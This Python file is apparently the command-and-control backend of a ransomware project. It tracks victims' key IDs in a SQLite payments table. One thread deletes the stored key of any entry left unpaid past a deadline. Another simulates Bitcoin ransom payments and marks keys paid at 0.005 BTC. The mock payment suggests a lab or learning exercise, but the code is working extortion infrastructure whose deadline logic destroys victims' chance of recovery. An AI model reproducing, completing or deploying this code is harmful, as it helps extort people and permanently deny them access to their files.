import os
from datetime import datetime, timezone
import sqlite3
import threading
import time
import random
from C2_Variables import DB_PATH, KEY_STORAGE_DIR, seconds_left

####################################################################################################################

def check_expired_keys():
    while True:
        time.sleep(15)
        print("Checking for expired keys") # Debug Message
        expired_time = datetime.now(timezone.utc).timestamp() - seconds_left

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT unique_id, created_at FROM payments WHERE paid = 0')
        unpaid_keys = c.fetchall()

        for unique_id, created_at in unpaid_keys:
            if created_at is None:
                continue
            created_ts = datetime.strptime(created_at, "%Y-%m-%d %H:%M:%S").timestamp()
            if created_ts < expired_time:
                key_path = os.path.join(KEY_STORAGE_DIR, unique_id)
                if os.path.exists(key_path):
                    os.remove(key_path)
                c.execute('DELETE FROM payments WHERE unique_id = ?', (unique_id,)) # Removes expired keys
                print(f"{unique_id} Expired")
        
        conn.commit()
        conn.close()

####################################################################################################################

# This will just simulate mock payment
def mock_payment():
    while True:
        time.sleep(60)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT unique_id FROM payments WHERE paid = 0')
        unpaid = c.fetchall()

        for row in unpaid:
            unique_id = row[0]
            btc_received = random.uniform(0.004, 0.008)  # Random amount transfered for testing
            print(f"Received: {unique_id}: {btc_received:.6f} BTC")

            if btc_received >= 0.005:  # When btc_received is 0.005
                c.execute('UPDATE payments SET paid = 1 WHERE unique_id = ?', (unique_id,))
                print(f"Marked {unique_id} as PAID")
        
        conn.commit()
        conn.close()

####################################################################################################################

def start_mock_payment():
    thread = threading.Thread(target=mock_payment)
    thread.daemon = True
    thread.start()

def start_remove_expired_keys():
    thread = threading.Thread(target=check_expired_keys)
    thread.daemon = True
    thread.start()

####################################################################################################################